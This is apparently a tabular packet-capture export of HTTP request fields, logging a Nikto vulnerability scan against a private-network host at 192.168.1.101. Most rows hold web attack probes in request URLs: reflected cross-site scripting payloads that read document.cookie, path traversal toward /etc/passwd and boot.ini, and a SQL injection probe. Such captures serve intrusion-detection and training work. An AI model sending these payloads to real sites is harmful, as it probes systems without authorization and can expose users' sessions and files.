http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																	Keep-Alive										192.168.1.101									3108						1	http://192.168.1.101/web/wp-login.php/affich.php?image=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001223)				/web/wp-login.php/affich.php?image=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3112						1	http://192.168.1.101/web/wp-login.php/diapo.php?rep=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001224)				/web/wp-login.php/diapo.php?rep=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3116						1	http://192.168.1.101/web/wp-login.php/index.php?rep=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001225)				/web/wp-login.php/index.php?rep=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3120						1	http://192.168.1.101/web/wp-login.php/fcgi-bin/echo?foo=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001227)				/web/wp-login.php/fcgi-bin/echo?foo=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									3124						1	http://192.168.1.101/web/wp-login.php/fcgi-bin/echo2?foo=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001228)				/web/wp-login.php/fcgi-bin/echo2?foo=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									3128						1	http://192.168.1.101/web/wp-login.php/fcgi-bin/echo.exe?foo=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001229)				/web/wp-login.php/fcgi-bin/echo.exe?foo=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									3132						1	http://192.168.1.101/web/wp-login.php/fcgi-bin/echo2.exe?foo=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001230)				/web/wp-login.php/fcgi-bin/echo2.exe?foo=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									3136						1	http://192.168.1.101/web/wp-login.php/\"><img%20src=\"javascript:alert(document.domain)\">		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001236)				/web/wp-login.php/\"><img%20src=\"javascript:alert(document.domain)\">
																	Keep-Alive										192.168.1.101									3140						1	http://192.168.1.101/web/wp-login.php/apps/web/index.fcgi?servers=&section=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001241)				/web/wp-login.php/apps/web/index.fcgi?servers=&section=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3144						1	http://192.168.1.101/web/wp-login.php/index.php?err=3&email=\"><script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001378)				/web/wp-login.php/index.php?err=3&email=\"><script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3148						1	http://192.168.1.101/web/wp-login.php/forgot_password.php?email=\"><script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001379)				/web/wp-login.php/forgot_password.php?email=\"><script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3152						1	http://192.168.1.101/web/wp-login.php/bugs/index.php?err=3&email=\"><script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001380)				/web/wp-login.php/bugs/index.php?err=3&email=\"><script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3156						1	http://192.168.1.101/web/wp-login.php/bugs/forgot_password.php?email=\"><script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001381)				/web/wp-login.php/bugs/forgot_password.php?email=\"><script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3160						1	http://192.168.1.101/web/wp-login.php/eventum/index.php?err=3&email=\"><script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001382)				/web/wp-login.php/eventum/index.php?err=3&email=\"><script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3164						1	http://192.168.1.101/web/wp-login.php/eventum/forgot_password.php?email=\"><script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001383)				/web/wp-login.php/eventum/forgot_password.php?email=\"><script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3168						1	http://192.168.1.101/web/wp-login.php/forum/index.php?method=&lt;script&gt;alert('Vulnerable')&lt;/script&gt;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001453)				/web/wp-login.php/forum/index.php?method=&lt;script&gt;alert('Vulnerable')&lt;/script&gt;
																	Keep-Alive										192.168.1.101									3172						1	http://192.168.1.101/web/wp-login.php/zorum/index.php?method=&lt;script&gt;alert('Vulnerable')&lt;/script&gt;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001454)				/web/wp-login.php/zorum/index.php?method=&lt;script&gt;alert('Vulnerable')&lt;/script&gt;
																	Keep-Alive										192.168.1.101									3176						1	http://192.168.1.101/web/wp-login.php/login/sm_login_screen.php?error=\"><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001456)				/web/wp-login.php/login/sm_login_screen.php?error=\"><script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									3180						1	http://192.168.1.101/web/wp-login.php/login/sm_login_screen.php?uid=\"><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001457)				/web/wp-login.php/login/sm_login_screen.php?uid=\"><script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									3184						1	http://192.168.1.101/web/wp-login.php/SPHERA/login/sm_login_screen.php?error=\"><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001458)				/web/wp-login.php/SPHERA/login/sm_login_screen.php?error=\"><script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									3188						1	http://192.168.1.101/web/wp-login.php/SPHERA/login/sm_login_screen.php?uid=\"><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001459)				/web/wp-login.php/SPHERA/login/sm_login_screen.php?uid=\"><script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									3192						1	http://192.168.1.101/web/wp-login.php/acart2_0/signin.asp?msg=<script>alert(\"test\")</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001460)				/web/wp-login.php/acart2_0/signin.asp?msg=<script>alert(\"test\")</script>
																	Keep-Alive										192.168.1.101									3196						1	http://192.168.1.101/web/wp-login.php/jsp/jspsamp/jspexamples/viewsource.jsp?source=/../../../../../../../../../boot.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001469)				/web/wp-login.php/jsp/jspsamp/jspexamples/viewsource.jsp?source=/../../../../../../../../../boot.ini
																	Keep-Alive										192.168.1.101									3200						1	http://192.168.1.101/web/wp-login.php/jsp/jspsamp/jspexamples/viewsource.jsp?source=/../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001470)				/web/wp-login.php/jsp/jspsamp/jspexamples/viewsource.jsp?source=/../../../../../../../../../etc/passwd
																	Keep-Alive										192.168.1.101									3204						1	http://192.168.1.101/web/wp-login.php/index.php?vo=\"><script>alert(document.cookie);</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001487)				/web/wp-login.php/index.php?vo=\"><script>alert(document.cookie);</script>
																	Keep-Alive										192.168.1.101									3208						1	http://192.168.1.101/web/wp-login.php/admin/database/wwForum.mdb		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001490)				/web/wp-login.php/admin/database/wwForum.mdb
																	Keep-Alive										192.168.1.101									3212						1	http://192.168.1.101/web/wp-login.php/shopping/shopdisplayproducts.asp?id=1&cat=<script>alert('test')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001503)				/web/wp-login.php/shopping/shopdisplayproducts.asp?id=1&cat=<script>alert('test')</script>
																	Keep-Alive										192.168.1.101									3216						1	http://192.168.1.101/web/wp-login.php/shopdisplayproducts.asp?id=1&cat=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001504)				/web/wp-login.php/shopdisplayproducts.asp?id=1&cat=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3220						1	http://192.168.1.101/web/wp-login.php/banners.php?op=EmailStats&cid=1%20AND%20passwd%20LIKE%20'a%'/*		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001506)				/web/wp-login.php/banners.php?op=EmailStats&cid=1%20AND%20passwd%20LIKE%20'a%'/*
																	Keep-Alive										192.168.1.101									3224						1	http://192.168.1.101/web/wp-login.php/showmail.pl?Folder=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001510)				/web/wp-login.php/showmail.pl?Folder=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3228						1	http://192.168.1.101/web/wp-login.php/search.asp?Search=\">&lt;script&gt;alert(Vulnerable)&lt;/script&gt;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003017)				/web/wp-login.php/search.asp?Search=\">&lt;script&gt;alert(Vulnerable)&lt;/script&gt;
																	Keep-Alive										192.168.1.101									3232						1	http://192.168.1.101/web/wp-login.php/firewall/policy/dlg?q=-1&fzone=t<script>alert('Vulnerable')</script>>&tzone=dmz		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003030)				/web/wp-login.php/firewall/policy/dlg?q=-1&fzone=t<script>alert('Vulnerable')</script>>&tzone=dmz
																	Keep-Alive										192.168.1.101									3236						1	http://192.168.1.101/web/wp-login.php/firewall/policy/policy?fzone=internal&tzone=dmz1<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003031)				/web/wp-login.php/firewall/policy/policy?fzone=internal&tzone=dmz1<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									3240						1	http://192.168.1.101/web/wp-login.php/antispam/listdel?file=blacklist&name=b<script>alert('Vulnerable')</script>&startline=0		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003032)				/web/wp-login.php/antispam/listdel?file=blacklist&name=b<script>alert('Vulnerable')</script>&startline=0
																	Keep-Alive										192.168.1.101									3244						1	http://192.168.1.101/web/wp-login.php/antispam/listdel?file=whitelist&name=a<script>alert('Vulnerable')</script>&startline=0(naturally)		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003033)				/web/wp-login.php/antispam/listdel?file=whitelist&name=a<script>alert('Vulnerable')</script>&startline=0(naturally)
																	Keep-Alive										192.168.1.101									3248						1	http://192.168.1.101/web/wp-login.php/theme1/selector?button=status,monitor,session&button_url=/system/status/status,/system/status/moniter,/system/status/session		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003034)				/web/wp-login.php/theme1/selector?button=status,monitor,session&button_url=/system/status/status,/system/status/moniter,/system/status/session
																	Keep-Alive										192.168.1.101									3252						1	http://192.168.1.101/web/wp-login.php/theme1/selector?button=status,monitor,session&button_url=/system/status/status,/system/status/moniter\"><script>alert('Vulnerable')</script>,/system/status/session		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003035)				/web/wp-login.php/theme1/selector?button=status,monitor,session&button_url=/system/status/status,/system/status/moniter\"><script>alert('Vulnerable')</script>,/system/status/session
																	Keep-Alive										192.168.1.101									3256						1	http://192.168.1.101/web/wp-login.php/theme1/selector?button=status,monitor,session&button_url=/system/status/status\"><script>alert('Vulnerable')</script>,/system/status/moniter,/system/status/session		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003036)				/web/wp-login.php/theme1/selector?button=status,monitor,session&button_url=/system/status/status\"><script>alert('Vulnerable')</script>,/system/status/moniter,/system/status/session
																	Keep-Alive										192.168.1.101									3260						1	http://192.168.1.101/web/wp-login.php/theme1/selector?button=status,monitor,session\"><script>alert('Vulnerable')</script>&button_url=/system/status/status,/system/status/moniter,/system/status/session		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003037)				/web/wp-login.php/theme1/selector?button=status,monitor,session\"><script>alert('Vulnerable')</script>&button_url=/system/status/status,/system/status/moniter,/system/status/session
																	Keep-Alive										192.168.1.101									3264						1	http://192.168.1.101/web/wp-login.php/search.asp?Search=		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003038)				/web/wp-login.php/search.asp?Search=
																	Keep-Alive										192.168.1.101									3268						1	http://192.168.1.101/web/wp-login.php/examplesWebApp/InteractiveQuery.jsp?person=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003081)				/web/wp-login.php/examplesWebApp/InteractiveQuery.jsp?person=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									3272						1	http://192.168.1.101/web/wp-login.php/sgdynamo.exe?HTNAME=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003083)				/web/wp-login.php/sgdynamo.exe?HTNAME=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									3276						1	http://192.168.1.101/web/wp-login.php/aktivate/cgi-bin/catgy.cgi?key=0&cartname=axa200135022551089&desc=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003086)				/web/wp-login.php/aktivate/cgi-bin/catgy.cgi?key=0&cartname=axa200135022551089&desc=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									3280						1	http://192.168.1.101/web/wp-login.php/webcalendar/colors.php?color=</script><script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003117)				/web/wp-login.php/webcalendar/colors.php?color=</script><script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3282						1	http://192.168.1.101/web/wp-login.php/webcalendar/week.php?user=\"><script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003118)				/web/wp-login.php/webcalendar/week.php?user=\"><script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3286						1	http://192.168.1.101/web/wp-login.php/debug/dbg?host==<script>alert('Vulnerable');</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003122)				/web/wp-login.php/debug/dbg?host==<script>alert('Vulnerable');</script>
																	Keep-Alive										192.168.1.101									3290						1	http://192.168.1.101/web/wp-login.php/debug/echo?name=<script>alert('Vulnerable');</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003123)				/web/wp-login.php/debug/echo?name=<script>alert('Vulnerable');</script>
																	Keep-Alive										192.168.1.101									3294						1	http://192.168.1.101/web/wp-login.php/debug/errorInfo?title===<script>alert('Vulnerable');</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003124)				/web/wp-login.php/debug/errorInfo?title===<script>alert('Vulnerable');</script>
																	Keep-Alive										192.168.1.101									3298						1	http://192.168.1.101/web/wp-login.php/debug/showproc?proc===<script>alert('Vulnerable');</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003125)				/web/wp-login.php/debug/showproc?proc===<script>alert('Vulnerable');</script>
																	Keep-Alive										192.168.1.101									3302						1	http://192.168.1.101/web/wp-login.php/search.php?sess=your_session_id&lookfor=&lt;script&gt;alert(document.cookie)&lt;/script&gt;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003150)				/web/wp-login.php/search.php?sess=your_session_id&lookfor=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
																	Keep-Alive										192.168.1.101									3306						1	http://192.168.1.101/web/wp-login.php/addressbook.php?\"><script>alert(Vulnerable)</script><!--		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003170)				/web/wp-login.php/addressbook.php?\"><script>alert(Vulnerable)</script><!--
																	Keep-Alive										192.168.1.101									3310						1	http://192.168.1.101/web/wp-login.php/options.php?optpage=<script>alert('Vulnerable!')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003171)				/web/wp-login.php/options.php?optpage=<script>alert('Vulnerable!')</script>
																	Keep-Alive										192.168.1.101									3314						1	http://192.168.1.101/web/wp-login.php/search.php?mailbox=INBOX&what=x&where=<script>alert('Vulnerable!')</script>&submit=Search		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003172)				/web/wp-login.php/search.php?mailbox=INBOX&what=x&where=<script>alert('Vulnerable!')</script>&submit=Search
																	Keep-Alive										192.168.1.101									3318						1	http://192.168.1.101/web/wp-login.php/help.php?chapter=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003173)				/web/wp-login.php/help.php?chapter=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									3322						1	http://192.168.1.101/web/wp-login.php/src/read_body.php?mailbox=%3Cscript%3Ealert(Vulnerable)%3C%2Fscript%3E&passed_id=%3Cscript%3Ealert(Vulnerable)%3C%2Fscript%3E&startMessage=1&show_more=0		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003174)				/web/wp-login.php/src/read_body.php?mailbox=%3Cscript%3Ealert(Vulnerable)%3C%2Fscript%3E&passed_id=%3Cscript%3Ealert(Vulnerable)%3C%2Fscript%3E&startMessage=1&show_more=0
																	Keep-Alive										192.168.1.101									3326						1	http://192.168.1.101/web/wp-login.php/acart2_0/deliver.asp?msg=<script>alert(\"test\")</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003185)				/web/wp-login.php/acart2_0/deliver.asp?msg=<script>alert(\"test\")</script>
																	Keep-Alive										192.168.1.101									3330						1	http://192.168.1.101/web/wp-login.php/acart2_0/error.asp?msg=<script>alert(\"test\")</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003186)				/web/wp-login.php/acart2_0/error.asp?msg=<script>alert(\"test\")</script>
																	Keep-Alive										192.168.1.101									3334						1	http://192.168.1.101/web/wp-login.php/acart2_0/admin/error.asp?msg=<script>alert(\"test\")</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003187)				/web/wp-login.php/acart2_0/admin/error.asp?msg=<script>alert(\"test\")</script>
																	Keep-Alive										192.168.1.101									3338						1	http://192.168.1.101/web/wp-login.php/acart2_0/admin/index.asp?msg=<script>alert(\"test\")</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003188)				/web/wp-login.php/acart2_0/admin/index.asp?msg=<script>alert(\"test\")</script>
																	Keep-Alive										192.168.1.101									3342						1	http://192.168.1.101/web/wp-login.php/wwwping/index.stm?wwwsite=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003226)				/web/wp-login.php/wwwping/index.stm?wwwsite=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3346						1	http://192.168.1.101/web/wp-login.php/sysuser/docmgr/create.stm?path=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003227)				/web/wp-login.php/sysuser/docmgr/create.stm?path=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3350						1	http://192.168.1.101/web/wp-login.php/sysuser/docmgr/edit.stm?path=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003228)				/web/wp-login.php/sysuser/docmgr/edit.stm?path=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3354						1	http://192.168.1.101/web/wp-login.php/sysuser/docmgr/ftp.stm?path=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003229)				/web/wp-login.php/sysuser/docmgr/ftp.stm?path=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3358						1	http://192.168.1.101/web/wp-login.php/sysuser/docmgr/htaccess.stm?path=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003230)				/web/wp-login.php/sysuser/docmgr/htaccess.stm?path=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3362						1	http://192.168.1.101/web/wp-login.php/sysuser/docmgr/iecreate.stm?path=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003231)				/web/wp-login.php/sysuser/docmgr/iecreate.stm?path=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3366						1	http://192.168.1.101/web/wp-login.php/sysuser/docmgr/ieedit.stm?path=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003232)				/web/wp-login.php/sysuser/docmgr/ieedit.stm?path=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3370						1	http://192.168.1.101/web/wp-login.php/sysuser/docmgr/info.stm?path=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003233)				/web/wp-login.php/sysuser/docmgr/info.stm?path=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3374						1	http://192.168.1.101/web/wp-login.php/sysuser/docmgr/mkdir.stm?path=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003234)				/web/wp-login.php/sysuser/docmgr/mkdir.stm?path=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3378						1	http://192.168.1.101/web/wp-login.php/sysuser/docmgr/rename.stm?path=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003235)				/web/wp-login.php/sysuser/docmgr/rename.stm?path=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3382						1	http://192.168.1.101/web/wp-login.php/sysuser/docmgr/search.stm?path=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003236)				/web/wp-login.php/sysuser/docmgr/search.stm?path=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3386						1	http://192.168.1.101/web/wp-login.php/sysuser/docmgr/sendmail.stm?path=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003237)				/web/wp-login.php/sysuser/docmgr/sendmail.stm?path=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3390						1	http://192.168.1.101/web/wp-login.php/sysuser/docmgr/template.stm?path=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003238)				/web/wp-login.php/sysuser/docmgr/template.stm?path=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3394						1	http://192.168.1.101/web/wp-login.php/sysuser/docmgr/update.stm?path=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003239)				/web/wp-login.php/sysuser/docmgr/update.stm?path=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3398						1	http://192.168.1.101/web/wp-login.php/sysuser/docmgr/vccheckin.stm?path=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003240)				/web/wp-login.php/sysuser/docmgr/vccheckin.stm?path=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3402						1	http://192.168.1.101/web/wp-login.php/sysuser/docmgr/vccreate.stm?path=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003241)				/web/wp-login.php/sysuser/docmgr/vccreate.stm?path=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3406						1	http://192.168.1.101/web/wp-login.php/sysuser/docmgr/vchist.stm?path=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003242)				/web/wp-login.php/sysuser/docmgr/vchist.stm?path=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101															1	http://192.168.1.101/web/wp-login.php/sysuser/docmgr/edit.stm?name=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003243)				/web/wp-login.php/sysuser/docmgr/edit.stm?name=<script>alert(document.cookie)</script>
